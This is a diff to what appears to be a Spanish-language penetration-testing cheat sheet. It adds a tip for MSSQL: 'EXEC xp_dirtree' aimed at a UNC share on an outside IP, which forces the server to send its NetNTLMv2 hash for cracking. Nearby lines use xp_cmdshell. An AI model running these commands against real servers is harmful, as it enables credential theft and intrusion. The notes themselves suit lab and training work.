@@ -4071,6 +4071,13 @@ xp_cmdshell whoami
 enable_xp_cmdshell
 ```
 
+Puedes conseguir el hash NetNTLMv2 con esto e intentar crackearlo
+
+```
+EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
+```
+
+
 ## Hash MD5
 
 Para sacar el hash md5 de un archivo cuando lo trasfieras usa:
